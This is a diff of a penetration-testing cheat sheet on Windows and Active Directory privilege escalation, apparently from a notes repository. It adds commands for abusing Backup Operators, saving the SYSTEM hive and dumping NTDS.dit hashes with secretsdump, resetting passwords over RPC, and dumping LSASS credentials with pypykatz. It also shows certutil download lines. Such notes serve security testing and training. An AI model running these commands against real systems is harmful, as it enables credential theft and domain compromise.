@@ -63,24 +63,6 @@ Start-BitsTransfer -Source <url> -Destination <output_file>
 certutil -urlcache -f <url> output_file<>
 ```
 
-# Directories to check
-```bash
-# Temporary folder
-C:\Windows\System32\spool\drivers\color
-
-# See any suspicious apps 
-"C:\Program Files" or "C:\Program Files (x86)"
-
-# Apps on old windows versions
-C:\Data\Users\app
-
-# Code policies and passwords in files
-C:\program files\windowspowershell\modules\packagemanagement
-
-# Config files
-C:\Windows\System32\config
-```
-
 ### PowerView
 **Make credentials**
 ```powershell
@@ -105,6 +87,27 @@ Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalI
 ### References
 - [Powerview and PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
+# Directories to check
+```bash
+# Temporary folder
+C:\Windows\System32\spool\drivers\color
+
+# See any suspicious apps 
+"C:\Program Files" or "C:\Program Files (x86)"
+
+# Apps on old windows versions
+C:\Data\Users\app
+
+# Code policies and passwords in files
+C:\program files\windowspowershell\modules\packagemanagement
+
+# Config files
+C:\Windows\System32\config
+
+# AD database file location
+C:\Windows\NTDS
+```
+
 
 # Privileged groups
 ## AD Recycle Bin
@@ -112,6 +115,49 @@ A user in the group is allowed to read / recover deleted AD objects.
 ```powershell
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+
+## AD support accounts
+Often we have the credentials of limited administrative accounts such as `IT``, `helpdesk` or `support`. Sometimes, These accounts have an ability reset the password.     
+*Note that the wording of the account name might be different, but related to aforementioned privileges*
+
+## RPC password reset
+[https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password)
+
+```bash
+setuserinfo2 <user> 23 <password>
+```
+
+## AD Backup Operators
+Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files
+
+```powershell
+# Import libraries
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+# Enable SeBackupPrivilege
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
+
+## Get hashes from .dit file
+```bash
+# REMOTE
+reg.exe save hklm\system <destination>
+
+# LOCAL (after file downloads)
+secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
+```
+
+### Scripts needed
+- [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)
+
+#### References
+- [https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Backup-Operators](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Backup-Operators)
+- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators-1](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators-1)
+- [https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/](https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/)
+- [https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)
+
 
 # Active Directory
 ## BloodHound and SharpHound
@@ -265,7 +311,20 @@ echo -n <string> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660
 This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
 [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 
-# Softwares
+# Softwares / Processes
+## LSASS process
+Local Security Authority Server Service is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system     
+**From these processes, one might be able to harvest credentials from process's dump file**
+
+### Dump
+[https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)    
+```bash
+pypykatz lsa minidump <lsass_dump_file>
+``` 
+
+#### References
+- [https://attack.mitre.org/techniques/T1003/001/](https://attack.mitre.org/techniques/T1003/001/)
+
 ## mRemoteNG
 mRemoteNG is a remote connection management tool, and it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:
 
